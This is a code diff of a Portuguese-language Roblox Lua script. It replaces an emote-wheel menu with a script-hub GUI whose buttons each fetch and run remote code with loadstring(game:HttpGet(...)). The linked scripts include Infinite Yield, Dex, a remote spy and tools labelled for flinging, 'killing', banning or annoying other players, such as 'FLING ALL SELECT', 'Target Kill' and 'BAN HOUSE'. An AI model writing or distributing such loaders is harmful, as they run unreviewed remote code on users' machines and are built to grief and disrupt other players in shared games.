+local PageTools = Create("ScrollingFrame", MainFrame, {Size = UDim2.new(1, -16, 1, -145), Position = UDim2.new(0, 8, 0, 75), BackgroundTransparency = 1, Visible = false, CanvasSize = UDim2.new(0, 0, 0, 250), ScrollBarThickness = 3, ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255), ScrollingEnabled = true, ZIndex = 11})
+Create("UIGridLayout", PageTools, {CellSize = UDim2.new(0, 64, 0, 72), CellPadding = UDim2.new(0, 4, 0, 8), HorizontalAlignment = Enum.HorizontalAlignment.Center})
+
+local WhiteBarSeparator = Create("Frame", MainFrame, {Name = "WhiteBarSeparator", Size = UDim2.new(1, -20, 0, 4), Position = UDim2.new(0.5, 0, 1, -78), AnchorPoint = Vector2.new(0.5, 0), BackgroundColor3 = Color3.fromRGB(255,255,255), BorderSizePixel = 0, Visible = false, ZIndex = 11})
+
+local FooterBar = Create("Frame", MainFrame, {Size = UDim2.new(1, 0, 0, 65), Position = UDim2.new(0, 0, 1, -65), BackgroundColor3 = Color3.fromRGB(22,22,22), BorderSizePixel = 0, ZIndex = 11})
+
+local CloseBtn = Create("TextButton", FooterBar, {Name = "CloseBtn", Size = UDim2.new(0, 160, 0, 42), Position = UDim2.new(0.5, -80, 0.5, -21), BackgroundColor3 = Color3.fromRGB(0,0,0), Text = "FECHAR UI", TextColor3 = Color3.fromRGB(255,255,255), TextSize = 22, Font = Enum.Font.Arcade, ZIndex = 12}, 6, {Color = Color3.fromRGB(255,255,255), Thickness = 1.5, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
+
+local function ToggleMenu(state)
+    MainFrame.Visible = state
+    DarkOverlay.Visible = state
+    if state then
+        dragToggle = false
     end
-    renderRadialState()
 end
 
-loadPage = function(targetPage)
-    searchToken = searchToken + 1
-    local myToken = searchToken
-    local localCount = applySearchLocal(currentKeyword)
+CloseBtn.MouseButton1Click:Connect(function()
+    PlayClickSound()
+    ToggleMenu(false)
+end)
 
-    if currentCategory ~= "All" then
-        local catSet = {}
-        for _, cat in ipairs(emoteData.categories) do
-            if cat.name == currentCategory then
-                for _, entry in ipairs(cat.emotes) do
-                    local eid = type(entry) == "table" and tostring(entry.id or entry) or tostring(entry)
-                    catSet[eid] = true
-                end
-                break
-            end
-        end
-        local filtered = {}
-        -- Mantém a ordem exata que os emotes foram salvos na categoria
-        for _, e in ipairs(filteredEmotes) do
-            local eid = tostring(e.id or e.AssetId or e.Id)
-            if catSet[eid] then table.insert(filtered, e) end
-        end
-        -- Na verdade, para categoria, a ordem deve vir da própria tabela da categoria
-        if currentCategory ~= "All" then
-            local catEmotesOrder = {}
-            for _, cat in ipairs(emoteData.categories) do
-                if cat.name == currentCategory then
-                    for _, entry in ipairs(cat.emotes) do
-                        local eid = type(entry) == "table" and tostring(entry.id or entry) or tostring(entry)
-                        local originalEmote = emoteIndexById[eid]
-                        if originalEmote then
-                            table.insert(catEmotesOrder, originalEmote)
-                        elseif type(entry) == "table" then
-                            table.insert(catEmotesOrder, {id = entry.id, name = entry.name})
-                        end
-                    end
-                    break
-                end
-            end
-            if #catEmotesOrder > 0 then
-                filtered = catEmotesOrder
-            end
-        end
-        
-        filteredEmotes = filtered; localCount = #filteredEmotes
-    end
+local function CreateSymbol(pos)
+    return Create("ImageLabel", FooterBar, {Size = UDim2.new(0, 45, 0, 45), Position = pos, BackgroundTransparency = 1, Image = "rbxassetid://130275641191868", ImageColor3 = Color3.fromRGB(255,255,255), ZIndex = 12})
+end
+CreateSymbol(UDim2.new(0, 15, 0.5, -22)); CreateSymbol(UDim2.new(1, -60, 0.5, -22))
 
-    totalPages = math.max(1, math.ceil(localCount / 8))
-    if targetPage > totalPages then targetPage = totalPages end
-    if targetPage < 1 then targetPage = 1 end
-    currentPage = targetPage
-    pageTextBox.Text = tostring(currentPage)
-    pageInfoLabel.Text = tostring(totalPages)
+local DiscordBtn = Create("ImageButton", FooterBar, {Name = "DiscordBtn", Size = UDim2.new(0, 45, 0, 45), Position = UDim2.new(0, 65, 0.5, -22), BackgroundTransparency = 1, Image = "rbxassetid://135394655692633", Visible = true, ZIndex = 12})
+DiscordBtn.MouseButton1Click:Connect(function() PlayClickSound(); loadstring(game:HttpGet("https://raw.githubusercontent.com/YuMAID369/Join-Discordv1/refs/heads/main/Discord%20Open"))() end)
 
-    selectedIndex = nil
-    hoveredIndex = nil
+local ExtraFeatureBtn = Create("ImageButton", FooterBar, {
+    Name = "ExtraFeatureBtn", 
+    Size = UDim2.new(0, 42, 0, 42), 
+    Position = UDim2.new(0.5, 92, 0.5, -21), 
+    BackgroundTransparency = 1, 
+    Image = "rbxassetid://95100181226164", 
+    Visible = true, 
+    ZIndex = 12
+})
+ExtraFeatureBtn.MouseButton1Click:Connect(function() 
+    PlayClickSound() 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/function-fin/ANTI-SLATKEEPER-HARASSMENT/refs/heads/main/PROJECT%20ANTI"))() 
+end)
 
-    catalogItems = {}
-    local startIdx = (currentPage - 1) * 8 + 1
-    for j = 0, 7 do
-        if filteredEmotes[startIdx + j] then table.insert(catalogItems, filteredEmotes[startIdx + j]) end
-    end
-    updateWheelSlots()
-    renderRadialState()
+-- NOVO BOTÃO DE FUNÇÃO ADICIONADO NA ABA BRK (AO LADO DO BOTÃO DE FECHAR UI)
+local NewFeatureBtn = Create("ImageButton", FooterBar, {
+    Name = "NewFeatureBtn", 
+    Size = UDim2.new(0, 42, 0, 42), 
+    Position = UDim2.new(0.5, -140, 0.5, -21), 
+    BackgroundTransparency = 1, 
+    Image = "rbxassetid://80947825662336", 
+    Visible = false, -- Inicialmente oculto, pois a página inicial (1) é "Sobre"
+    ZIndex = 12
+})
+NewFeatureBtn.MouseButton1Click:Connect(function() 
+    PlayClickSound() 
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/function-fin/ARMAZ-M-E-ORDEM-/refs/heads/main/Beta%20Ordem"))() 
+end)
 
-    if localCount < 8 and currentKeyword ~= "" and currentCategory == "All" then
-        task.spawn(function()
-            local apiList = FetchFromAPI(currentKeyword)
-            if myToken ~= searchToken then return end
-            if #apiList > 0 then
-                local merged = mergeNoDupes(filteredEmotes, apiList)
-                filteredEmotes = merged; totalPages = math.max(1, math.ceil(#merged / 8))
-                local added = false
-                for _, novo in ipairs(apiList) do
-                    if not emoteIndexById[tostring(novo.id)] then table.insert(allEmotes, novo); emoteIndexById[tostring(novo.id)] = novo; added = true end
-                end
-                if added then SaveJSON(EMOTE_CACHE_FILE, allEmotes) end
-                if targetPage > totalPages then targetPage = totalPages end
-                currentPage = targetPage
-                pageTextBox.Text = tostring(currentPage)
-                pageInfoLabel.Text = tostring(totalPages)
-                catalogItems = {}
-                local newStart = (currentPage - 1) * 8 + 1
-                for j = 0, 7 do if filteredEmotes[newStart + j] then table.insert(catalogItems, filteredEmotes[newStart + j]) end end
-                updateWheelSlots()
-            end
-        end)
+local AdapterBtn = Create("ImageButton", FooterBar, {Name = "AdapterBtn", Size = UDim2.new(0, 45, 0, 45), Position = UDim2.new(0, 65, 0.5, -22), BackgroundTransparency = 1, Image = "rbxassetid://73146839145612", Visible = false, ZIndex = 12})
+AdapterBtn.MouseButton1Click:Connect(function() PlayClickSound(); loadstring(game:HttpGet("https://raw.githubusercontent.com/function-fin/ADAPTADOR-1.0-V1-SPAWN/refs/heads/main/Modified%20Tools%20Adapter"))() end)
+
+local GuideBtn = Create("ImageButton", FooterBar, {Name = "GuideBtn", Size = UDim2.new(0, 45, 0, 45), Position = UDim2.new(1, -110, 0.5, -22), BackgroundTransparency = 1, Image = "rbxassetid://82557612348731", Visible = false, ZIndex = 12})
+GuideBtn.MouseButton1Click:Connect(function() PlayClickSound(); loadstring(game:HttpGet("https://raw.githubusercontent.com/function-fin/AVISO-IMPORTANTE-PAINEL-TOOL/refs/heads/main/TOOL%20AN%C3%9ANCIO%20GUIA"))() end)
+
+local currentPage = 1
+local function updateNavigation(page)
+    currentPage = page
+    PageAbout.Visible = (page == 1)
+    PageScripts.Visible = (page == 2)
+    PageTools.Visible = (page == 3)
+    WhiteBarSeparator.Visible = (page == 3)
+
+    DiscordBtn.Visible = (page == 1)
+    ExtraFeatureBtn.Visible = (page == 1)
+    NewFeatureBtn.Visible = (page == 2) -- Visível apenas na Aba 2 (BROOKHAVEN)
+    AdapterBtn.Visible = (page == 3)
+    GuideBtn.Visible = (page == 3)
+
+    local titleData = {
+        [1] = {text = "Sobre o ᓵ⚍ʖリ╎ℸ ", size = 28, uSize = UDim2.new(1, 0, 0, 50), pos = UDim2.new(0, 0, 0, 5), left = false, right = true},
+        [2] = {text = "BROOKHAVEN", size = 40, uSize = UDim2.new(1, 0, 0, 50), pos = UDim2.new(0, 0, 0, 5), left = true, right = true},
+        [3] = {text = "Painel Tool", size = 35, uSize = UDim2.new(1, -100, 0, 50), pos = UDim2.new(0, 50, 0, 5), left = true, right = false}
+    }
+    local conf = titleData[page]
+    Title.Text, Title.TextSize, Title.Size, Title.Position = conf.text, conf.size, conf.uSize, conf.pos
+    LeftBtn.Visible, RightBtn.Visible = conf.left, conf.right
+end
+
+RightBtn.MouseButton1Click:Connect(function() if currentPage < 3 then PlayClickSound(); updateNavigation(currentPage + 1) end end)
+LeftBtn.MouseButton1Click:Connect(function() if currentPage > 1 then PlayClickSound(); updateNavigation(currentPage - 1) end end)
+
+local ScriptData = {
+    ["CLOCK V2 Deep SPWN"] = "https://raw.githubusercontent.com/function-fin/01/refs/heads/main/01",
+    ["RSPY 0.0.0.1"] = "https://raw.githubusercontent.com/function-fin/RSPY-RECONSTRU-DO-E-ADAPTADO/refs/heads/main/SPAWN%20RSPY",
+    ["DEX OLD"] = "https://raw.githubusercontent.com/infyiff/backup/main/dex.lua",
+    ["Terminal Join Server"] = "https://raw.githubusercontent.com/YuMAID369/Terminal-Join-Server-SpwnCub-/refs/heads/main/SPWN%20Join",
+    ["Sound ALL Beta"] = "https://raw.githubusercontent.com/function-fin/Sound-ALL-Project/refs/heads/main/Sound%20ALL",
+    ["CLOCK CREATOR PROPs"] = "https://raw.githubusercontent.com/YuMAID369/CLOCK-Creator-Project-PROP-SPWN/refs/heads/main/CLOCK%20Creator%20Project%20PROP%20SPWN%20CLIENT%20V1",
+    ["DELETE PLAYER Anti NUKE"] = "https://raw.githubusercontent.com/YuMAID369/Anti-PLAYER-/refs/heads/main/REMOVE%20PLAYER",
+    ["Summoner Vehicles Panel"] = "https://raw.githubusercontent.com/YuMAID369/VEHICLE-KILL-PANEL-/refs/heads/main/Summoner%20Vehicles%20V1%20KILL",
+    ["HIDDEN LIBRARY SPWN"] = "https://raw.githubusercontent.com/YuMAID369/Bloco-de-Notas-SpawnCUB/refs/heads/main/Notebook%20Notes",
+    ["Cronômetro V1"] = "https://raw.githubusercontent.com/YuMAID369/Cron-metro-Spwn-v1/refs/heads/main/00%3A00%3A00",
+    ["ENTER ID#"] = "https://raw.githubusercontent.com/YuMAID369/ENTER-ID-/refs/heads/main/ENTER%20ID%23%20000",
+    ["CALCULATOR STUDIES"] = "https://raw.githubusercontent.com/function-fin/Roblox-Studs-Calculator-Beta/refs/heads/main/STUDS%20Calculecter0.0.0.0.1",
+    ["SPWAN Coordinates"] = "https://raw.githubusercontent.com/YuMAID369/Coordenadas-Ui-/refs/heads/main/Coordenadas%20SPWN%20V1",
+    ["Vehicle Speed Upgrade"] = "https://raw.githubusercontent.com/function-fin/Ve-culo-Upgrade-Turbo-/refs/heads/main/Vehicle%20S",
+    ["40k Emotes SPWAM"] = "https://raw.githubusercontent.com/function-fin/Roblox-/refs/heads/main/TESTES",
+    ["CHINOOK ANNOY"] = "https://raw.githubusercontent.com/function-fin/PROJECT-CHINOOK/refs/heads/main/0.1",
+    ["SELECT MATTER TP"] = "https://raw.githubusercontent.com/YuMAID369/ToolSpwnTp/refs/heads/main/SPWNTPtool",
+    ["TIME STOP V1 BETA"] = "https://raw.githubusercontent.com/YuMAID369/TIME-STOP-V1-SPWN-/refs/heads/main/Stop%20time%20SpwnCub",
+    ["BUFF Humanoid Simple"] = "https://raw.githubusercontent.com/function-fin/Buff-Simple/refs/heads/main/SIMPLE%20BUFF%20UPDATE",
+    ["SCANNER PARTS AND MATTER"] = "https://raw.githubusercontent.com/function-fin/Scanner-MATTER-Server/refs/heads/main/Scanner%20MATTER%20Beta",
+    ["HUMANOID STATUS VIEW"] = "https://raw.githubusercontent.com/YuMAID369/Humanoid-Status-VIEW-/refs/heads/main/SPWNCUB",
+    ["Documentation"] = "https://raw.githubusercontent.com/function-fin/Lore-confidential-document/refs/heads/main/Paperwork",
+    ["FLY GUI MARK"] = "https://raw.githubusercontent.com/YuMAID369/MARK-V1-FLY-GUI-/refs/heads/main/MARK%20FLY%20GUI%20V2",
+    ["BAN HOUSE"] = "https://raw.githubusercontent.com/YuMAID369/BAN-HOUSE-/refs/heads/main/BrookHaven",
+    ["INSPECIONAR AVATAR"] = "https://raw.githubusercontent.com/YuMAID369/INSPECT-AV2/refs/heads/main/idsAV2",
+    ["FREEZE EMOTE AND VELOCIDADE"] = "https://raw.githubusercontent.com/YuMAID369/FreezeEmote-/refs/heads/main/Universal%20Emote%20Lock",
+    ["EMOTES"] = "https://rawscripts.net/raw/Universal-Script-7yd7-I-Emote-Script-48024",
+    ["SHADERS"] = "https://raw.githubusercontent.com/YuMAID369/Shaders-V1/refs/heads/main/CUBNIT",
+    ["MANOPLA V1"] = "https://raw.githubusercontent.com/YuMAID369/MANOPLA-V2/refs/heads/main/HAND",
+    ["INFINITY YIELD"] = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",
+    ["TP TOOL"] = "https://raw.githubusercontent.com/YuMAID369/TP-TOOL-v1/refs/heads/main/TP%20Tool",
+    ["TP POINT"] = "https://raw.githubusercontent.com/YuMAID369/Teletransporte-/refs/heads/main/SpawnCUB",
+    ["FREE CAM"] = "https://raw.githubusercontent.com/YuMAID369/SpawnCam/refs/heads/main/Universal%20Cam",
+    ["CHAT MICKEY"] = "https://rawscripts.net/raw/Brookhaven-RP-Mickey-Chat-85762",
+    ["Prop R15 Structure"] = "https://raw.githubusercontent.com/function-fin/ROBOT-R15/refs/heads/main/PROP%20ROBOT",
+    ["TELEKINESIS"] = "https://raw.githubusercontent.com/YuMAID369/TELEKINESIS-/refs/heads/main/Telekinesis%20Tool",
+    ["FLING BALL V1"] = "https://raw.githubusercontent.com/YuMAID369/Fling-Ball-Cubnit-V1/refs/heads/main/Kill%20Ball%20V1",
+    ["FLING AURA BALL"] = "https://raw.githubusercontent.com/function-fin/Pr0t0tip0-aura-BA-/refs/heads/main/Aura%20BA/Aura%20BALL%20x1v2",
+    ["CHAT HIDDEN SPWN "] = "https://raw.githubusercontent.com/YuMAID369/Chat-Privado/refs/heads/main/OpenChatBeta",
+    ["VIEW"] = "https://raw.githubusercontent.com/YuMAID369/View-SpawnCUB-/refs/heads/main/View%20Din%C3%A2mico%20Beta",
+    ["PHYSICS"] = "https://raw.githubusercontent.com/YuMAID369/Humanoid-physics-manipulation/refs/heads/main/Physics%20Alterer",
+    ["SKYBOX NUKE"] = "https://raw.githubusercontent.com/YuMAID369/SKYBOX-V1/refs/heads/main/SKYBOX-SPAWN",
+    ["SOUND BOX GUI"] = "https://raw.githubusercontent.com/YuMAID369/Id-Brook-haven-m-sica/refs/heads/main/SpwnSom",
+    ["TOOL FLING ALL SELECT"] = "https://raw.githubusercontent.com/YuMAID369/Atom-selector-/refs/heads/main/Target%20Kill",
+    ["SELECT MATTER V2"] = "https://raw.githubusercontent.com/YuMAID369/SELECT-MATTER/refs/heads/main/SPWN%20KILL%20V2%20SELECT",
+    ["STAND AND BANG"] = "https://raw.githubusercontent.com/function-fin/Project-Bang-Stand/refs/heads/main/Experiment%20Stand",
+    ["SELECT MATTER V3"] = "https://raw.githubusercontent.com/YuMAID369/SELECT-MATTER-V3-/refs/heads/main/FLING%20V3%20TOOL%20SPWN",
+    ["VIEW V2 VRP"] = "https://raw.githubusercontent.com/YuMAID369/UI-View-V2-VPR/refs/heads/main/V2View%20VPR",
+    ["Prop data collector"] = "https://raw.githubusercontent.com/function-fin/Prop-data-collector-/refs/heads/main/Analyze%20structured%20data",
+}
+
+for name, link in pairs(ScriptData) do
+    local btn = Create("TextButton", PageScripts, {BackgroundColor3 = Color3.fromRGB(35,35,35), Text = name, TextColor3 = Color3.fromRGB(255,255,255), TextSize = 15, Font = Enum.Font.Arcade, TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Center, TextYAlignment = Enum.TextYAlignment.Center, ZIndex = 12}, 4)
+    btn.MouseButton1Click:Connect(function() PlayClickSound(); loadstring(game:HttpGet(link))() end)
+end
+
+local ToolData = {
+    {id = "7314683914561", name = "Fling Ball\nTool", link = "https://raw.githubusercontent.com/YuMAID369/Fling-Ball-Cubnit-V1/refs/heads/main/Kill%20Ball%20V1"},
+    {id = "7314683914562", name = "TOOL\nTELEKINESIS", link = "https://raw.githubusercontent.com/YuMAID369/TELEKINESIS-/refs/heads/main/Telekinesis%20Tool"},
+    {id = "7314683914563", name = "TP TOOL", link = "https://raw.githubusercontent.com/YuMAID369/TP-TOOL-v1/refs/heads/main/TP%20Tool"},
+    {id = "7314683914564", name = "FLING\nAll SELECT V1", link = "https://raw.githubusercontent.com/YuMAID369/Atom-selector-/refs/heads/main/Target%20Kill"},
+    {id = "7314683914565", name = "FLING\nAll SELECT V2", link = "https://raw.githubusercontent.com/YuMAID369/SELECT-MATTER/refs/heads/main/SPWN%20KILL%20V2%20SELECT"},
+    {id = "7314683914566", name = "SELECT\nMATTER TP", link = "https://raw.githubusercontent.com/YuMAID369/ToolSpwnTp/refs/heads/main/SPWNTPtool"},
+    {id = "7314683914567", name = "SELECT\nMATTER V3", link = "https://raw.githubusercontent.com/YuMAID369/SELECT-MATTER-V3-/refs/heads/main/FLING%20V3%20TOOL%20SPWN"},
+    {id = "7314683914568", name = "FLING AURA\nBALL", link = "https://raw.githubusercontent.com/function-fin/Pr0t0tip0-aura-BA-/refs/heads/main/Aura%20BA/Aura%20BALL%20x1v2"}
+}
+
+for _, data in ipairs(ToolData) do
+    local toolBtn = Create("TextButton", PageTools, {Name = "Tool_" .. data.id, BackgroundColor3 = Color3.fromRGB(45, 45, 45), Text = data.name, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, Font = Enum.Font.LuckiestGuy, TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Center, TextYAlignment = Enum.TextYAlignment.Center, ZIndex = 12}, 2)
+    if data.link ~= "" then
+        toolBtn.MouseButton1Click:Connect(function() PlayClickSound(); loadstring(game:HttpGet(data.link))() end)
+    else
+        toolBtn.AutoButtonColor = false
     end
 end
 
-prevButton.MouseButton1Click:Connect(function() if currentPage > 1 then loadPage(currentPage - 1) end end)
-nextButton.MouseButton1Click:Connect(function() if currentPage < totalPages then loadPage(currentPage + 1) end end)
-pageTextBox.FocusLost:Connect(function()
-    local num = tonumber(pageTextBox.Text)
-    if num then loadPage(math.clamp(num, 1, totalPages)) else pageTextBox.Text = tostring(currentPage) end
-end)
-searchBox.FocusLost:Connect(function()
-    currentKeyword = searchBox.Text; currentPage = 1; loadPage(1)
-end)
+local CloseConfirmFrame = Create("Frame", ScreenGui, {Name = "CloseConfirmFrame", AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.new(0, 340, 0, 185), BackgroundColor3 = Color3.fromRGB(0, 0, 0), BorderSizePixel = 0, Active = true, Draggable = true, Visible = false, ZIndex = 100}, nil, {Color = Color3.fromRGB(255, 255, 255), Thickness = 2, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
 
-buildCategoriesMenu = function()
-    for _, child in ipairs(sideScrolling:GetChildren()) do if child:IsA("TextButton") then child:Destroy() end end
+Create("ImageLabel", CloseConfirmFrame, {Name = "BackgroundSymbol", Size = UDim2.new(0, 150, 0, 150), Position = UDim2.new(0.5, 0, 0.5, 0), AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1, Image = "rbxassetid://130275641191868", ImageTransparency = 0.85, ZIndex = 101})
+Create("ImageLabel", CloseConfirmFrame, {Name = "GearIcon", Size = UDim2.new(0, 42, 0, 42), Position = UDim2.new(0, 12, 0, 10), BackgroundTransparency = 1, Image = "rbxassetid://122647049137802", ZIndex = 102})
+Create("TextLabel", CloseConfirmFrame, {Size = UDim2.new(0, 200, 0, 40), Position = UDim2.new(0, 58, 0, 10), BackgroundTransparency = 1, Text = "Encerrar Sessão", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 22, Font = Enum.Font.Arcade, TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 102})
 
-    local function createCatBtn(name, count, isAll)
-        local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(1, 0, 0, 34)
-        btn.BackgroundColor3 = (currentCategory == name) and Color3.fromRGB(40, 40, 40) or Color3.fromRGB(0, 0, 0)
-        btn.AutoButtonColor = false; btn.Text = ""; btn.Parent = sideScrolling
-        btn:SetAttribute("CategoryName", name)
-        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 7)
-        local stroke = Instance.new("UIStroke", btn)
-        stroke.Thickness = (currentCategory == name) and 2 or 1
-        stroke.Color = (currentCategory == name) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(100, 100, 100)
-        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+local CloseXBtn = Create("ImageButton", CloseConfirmFrame, {Name = "CloseXBtn", Size = UDim2.new(0, 32, 0, 32), Position = UDim2.new(1, -42, 0, 12), BackgroundTransparency = 1, Image = "rbxassetid://98235327129327", ZIndex = 102})
+Create("TextLabel", CloseConfirmFrame, {Size = UDim2.new(1, -20, 0, 45), Position = UDim2.new(0, 10, 0, 58), BackgroundTransparencypng = 1, Text = "Tem certeza de que deseja fechar o script?\nAlgumas funções poderão ser interrompidas.", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 13, Font = Enum.Font.Arcade, TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Center, ZIndex = 102})
 
-        local icon = Instance.new("ImageLabel")
-        icon.Size = UDim2.fromOffset(17, 17); icon.Position = UDim2.new(0, 10, 0.5, -8)
-        icon.BackgroundTransparency = 1; icon.Image = ID_ICONE_SOL
-        icon.ImageColor3 = (currentCategory == name) and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(200, 200, 200)
-        icon.Parent = btn
+local CancelBtn = Create("TextButton", CloseConfirmFrame, {Name = "CancelBtn", Size = UDim2.new(0, 120, 0, 35), Position = UDim2.new(0, 22, 1, -48), BackgroundColor3 = Color3.fromRGB(0, 0, 0), Text = "CANCELAR", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 15, Font = Enum.Font.Arcade, ZIndex = 102}, 4, {Color = Color3.fromRGB(255, 255, 255), Thickness = 1.5, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
+local ExitScriptBtn = Create("TextButton", CloseConfirmFrame, {Name = "ExitScriptBtn", Size = UDim2.new(0, 130, 0, 35), Position = UDim2.new(1, -152, 1, -48), BackgroundColor3 = Color3.fromRGB(0, 0, 0), Text = "FECHAR SCRIPT", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 15, Font = Enum.Font.Arcade, ZIndex = 102}, 4, {Color = Color3.fromRGB(255, 255, 255), Thickness = 1.5, ApplyStrokeMode = Enum.ApplyStrokeMode.Border})
 
-        local label = Instance.new("TextLabel")
-        label.Name = "CatTitle"; label.Size = UDim2.new(1, -54, 0, 17); label.Position = UDim2.new(0, 34, 0, 2)
-        label.BackgroundTransparency = 1; label.Text = name; label.TextColor3 = Color3.fromRGB(255, 255, 255)
-        label.TextSize = 12; label.Font = Enum.Font.Arcade; label.TextXAlignment = Enum.TextXAlignment.Left; label.Parent = btn
+CloseXBtn.MouseButton1Click:Connect(function() PlayClickSound(); CloseConfirmFrame.Visible = false end)
+CancelBtn.MouseButton1Click:Connect(function() PlayClickSound(); CloseConfirmFrame.Visible = false end)
+ExitScriptBtn.MouseButton1Click:Connect(function() PlayClickSound(); ScreenGui:Destroy() end)
 
-        local subtitle = Instance.new("TextLabel")
-        subtitle.Size = UDim2.new(1, -54, 0, 12); subtitle.Position = UDim2.new(0, 34, 0, 18)
-        subtitle.BackgroundTransparency = 1; subtitle.Text = isAll and "Todos os Emotes" or ("(" .. tostring(count) .. ")")
-        subtitle.TextColor3 = Color3.fromRGB(150, 150, 150); subtitle.TextSize = 10; subtitle.Font = Enum.Font.Arcade
-        subtitle.TextXAlignment = Enum.TextXAlignment.Left; subtitle.Parent = btn
-
-        if not isAll then
-            local pencil = Instance.new("ImageButton")
-            pencil.Size = UDim2.fromOffset(17, 17); pencil.Position = UDim2.new(1, -46, 0.5, -8)
-            pencil.BackgroundTransparency = 1; pencil.Image = ID_LAPIS; pencil.Parent = btn
-            pencil.MouseButton1Click:Connect(function() promptRenameCategory(name) end)
-        end
-
-        local arrow = Instance.new("TextLabel")
-        arrow.Size = UDim2.new(0, 14, 1, 0); arrow.Position = UDim2.new(1, -22, 0, 0)
-        arrow.BackgroundTransparency = 1; arrow.Text = ">"; arrow.TextColor3 = Color3.fromRGB(255, 255, 255)
-        arrow.TextSize = 13; arrow.Font = Enum.Font.Arcade; arrow.Parent = btn
-
-        btn.MouseButton1Click:Connect(function()
-            if currentCategory == name and not isAll then return end
-            currentCategory = name; currentPage = 1; loadPage(currentPage); buildCategoriesMenu()
-        end)
+local lastClick = 0
+OpenBtn.MouseButton1Click:Connect(function()
+    local currentTime = tick()
+    PlayClickSound()
+    if (currentTime - lastClick) < 0.35 then 
+        CloseConfirmFrame.Visible = true 
+    else 
+        ToggleMenu(not MainFrame.Visible)
     end
-
-    createCatBtn("All", #allEmotes, true)
-    for _, cat in ipairs(emoteData.categories) do createCatBtn(cat.name, #cat.emotes, false) end
-end
-
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == Enum.KeyCode.RightShift then
-        mainContainer.Visible = not mainContainer.Visible
-        toggleButton.Visible = not mainContainer.Visible
-        if not mainContainer.Visible then hoveredIndex = nil; renderRadialState() end
-    end
+    lastClick = currentTime
 end)
-
-local function mergeNoDupes(listA, listB)
-    local seen, out = {}, {}
-    for _, e in ipairs(listA) do local k = tostring(e.id); if not seen[k] then seen[k] = true; table.insert(out, e) end end
-    for _, e in ipairs(listB) do local k = tostring(e.id); if not seen[k] then seen[k] = true; table.insert(out, e) end end
-    return out
-end
-
-buildCategoriesMenu()
-loadPage(1)
-renderRadialState()
